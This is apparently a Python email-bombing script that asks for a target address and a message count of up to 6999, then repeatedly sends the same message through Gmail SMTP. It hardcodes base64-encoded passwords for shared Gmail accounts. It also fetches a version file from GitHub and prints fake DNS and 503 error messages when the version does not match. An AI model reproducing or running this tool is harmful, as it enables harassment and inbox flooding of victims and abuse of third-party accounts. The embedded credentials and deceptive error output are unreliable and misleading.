R = '\033[31m'
G = '\033[32m' 
C = '\033[36m'
W = '\033[0m' 

import time
import os
import csv
import random
import sys
import json
import argparse
import requests
import subprocess as subp
import smtplib
import time
import os
import getpass
import sys
import base64

row = []
info = ''
result = ''
systemR = '1.1.0'

def sys_check():
	print(G + '[>]' + C + ' Checking for system configurations....', end='')
	sys_url = 'https://raw.githubusercontent.com/mishakorzik/Email-Spammer/main/src/.start'
	try:
		sys_rqst = requests.get(sys_url)
		sys_sc = sys_rqst.status_code
		if sys_sc == 200:
			github_sys = sys_rqst.text
			github_sys = github_sys.strip()

			if systemR == github_sys:
				print(C + '[' + G + ' Succesful ' + C +']' + '\n')
				print(G + '[+] ' + C + 'System configuration checked! There are no failures')
			else:
				print(C + '[' + R + ' Failed ' + C +']' + '\n')
				print(R + '[-] ' + C + 'Error code: 106 DNS server refused to connect')
				print(R + '[-] ' + C + 'Error code: 503 Service Unavailable! Retry-After')
				print(R + '[-] ' + C + 'Please wait while we fix the problem...')
				sys.exit()
		else:
			print(C + '[' + R + ' Status : {} '.format(sys_sc) + C + ']' + '\n')
			print(R + '[-] ' + C + 'The system failed to start!')
			print(R + '[-] ' + C + 'Error code: 401 the server cannot boot')
	except Exception as e:
		print('\n' + R + '[-]' + C + ' Critical Error code: 105 Maybe you dont have internet - Exception : ' + W + str(e))


# gmail   : port = 587 , smtp_server = smtp.gmail.com
# outlook : port = 465 , smtp_server = smtp-mail.outlook.com
# yahoo   : port = 587 , smtp_server = smpt.mail.yahoo.com
# hotmail : port = 587 , smtp_server = smtp-mail.outlook.com
# MailRu  : port = 587 , smtp_server = smtp.mail.ru
# Yandex  : port = 465 , smtp_server = smtp.yandex.ru

GMAIL_PORT = "587"
YAHOO_PORT = "587"
OUTLOOK_PORT = "587"
YANDEX_PORT = "465"

subject = ""
body = "This is spam!"
server = "gmail"
os.system("clear")
sys_check()
os.system("clear")

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	LITBU = '\033[94m'
	
class FG:
    	black = "\033[30m"
    	red = "\033[31m"
    	green = "\033[32m"
    	orange = "\033[33m"
    	blue = "\033[34m"
    	purple = "\033[35m"
    	cyan = "\033[36m"
    	lightgrey = "\033[37m"
    	darkgrey = "\033[90m"
    	lightred = "\033[91m"
    	lightgreen = "\033[92m"
    	yellow = "\033[93m"
    	lightblue = "\033[94m"
    	pink = "\033[95m"
    	lightcyan = "\033[96m"

def start_bomb():
	os.system('clear')
	print(bcolors.OKGREEN + '''                            																											
[>] Preparing and attacking ...''')

os.system('clear')
print(bcolors.OKGREEN + '''

▓█████  ███▄ ▄███▓ ▄▄▄       ██▓  ██▓      ██████  ██▓███   ▄▄▄       ███▄ ▄███▓
▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒ ▓██▒    ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒
▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒ ▒██░    ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░
▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░ ▒██░      ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██
░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░ ░██████▒▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒
░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░  ▒░▓  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
 ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░  ░ ▒  ░░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░
   ░   ░      ░     ░   ▒    ▒ ░  ░  ░   ░  ░  ░  ░░         ░   ▒   ░      ░
   ░  ░       ░         ░  ░ ░       ░  ░      ░                 ░  ░       ░''')

print(bcolors.WARNING + '''												       
\033[95mSelect Mail Service:													
[1] Gmail/MailRu  -  powered google          By mishakorzik						
[2] Yahoo/Yahoo    -  powered microsoft         Version 1.1.27
[3] Outlook/Hotmail -  powered microsoft         Copyring © 2021
[4] Rambler/Aol      -  powered rambler/aol        Tranks for install''')

try:
	server = input(bcolors.WARNING + 'Mail Server: ' + bcolors.ENDC)
	print('1. smtp0python@gmail.com')
	print('2. smtp1python@gmail.com')
	print('3. smtp2python@gmail.com')
	print('4. smtp3python@gmail.com')
	print('5. smtp4python@gmail.com')
	print('6. smtp5python@gmail.com')
	print('7. smtp6python@gmail.com')
	print('8. smtp7python@gmail.com')
	print('9. smtp8python@gmail.com')
	print(bcolors.WARNING + 'example: smtp0python@gmail.com' + bcolors.ENDC)
	user = input(bcolors.WARNING + 'Select email: ' + bcolors.ENDC)

	if user == 'smtp3python@gmail.com' or user == 'smtp4python@gmail.com' or user == 'smtp6python@gmail.com' or user == 'smtp7python@gmail.com':
		base64_message = 'c210cDAwMHB5dGhvbjFnbWFpbA=='
	else:
		base64_message = 'c210cDBweXRob24xOGdtYWls'
	base64_bytes = base64_message.encode('ascii')
	message_bytes = base64.b64decode(base64_bytes)
	pwd = message_bytes.decode('ascii')

	to = input(bcolors.OKGREEN + 'Send To: ' + bcolors.ENDC)
	subject = input(bcolors.LITBU + 'Subject: ' + bcolors.ENDC)
	body = input(bcolors.OKGREEN + 'Message: ' + bcolors.ENDC)
	nomes = int(input(bcolors.OKGREEN + 'Number of Emails to send (1-6999): ' + bcolors.ENDC))
	no = 0
	message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
except KeyboardInterrupt:
	print(bcolors.FAIL + '\nCanceled! Quiting ...' + bcolors.ENDC)
	sys.exit()


#Gmail powered google
if server == '1' or server == '01' or server == '2' or server == '02' or server == '3' or server == '03' or server == '4' or server == '04' or server == 'gmail' or server == 'Gmail' or server == 'mailru' or server == 'Mailru' or server == 'outlook' or server == 'Outlook' or server == 'yahoo' or server == 'Yahoo' or server == 'rambler' or server == 'Rambler' or server == 'aol' or server == 'Aol':
	start_bomb()
	print(bcolors.WARNING + 'Email: ' + user + '  Target: ' + to)
	server = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		sys.exit()
	for i in range(1, nomes+1):
		try:
			server.sendmail(user, to, message)
			print(bcolors.WARNING + 'Successfully messenge sent! ' + str(no+1) + ' emails' + bcolors.ENDC)
			no += 1
		except KeyboardInterrupt:
			print(bcolors.FAIL + '\nTerminaling...' + bcolors.ENDC)
			sys.exit()
		except:
			print(bcolors.FAIL + "Messange failed to Send! ")
	server.close()
	print(bcolors.FAIL + 'Proccess Terminated! Please restart ...')
else:
        print(bcolors.FAIL + 'Works only with Gmail, MailRU, Rambler, Aol, Yahoo, Outlook and Hotmail.')
        sys.exit()


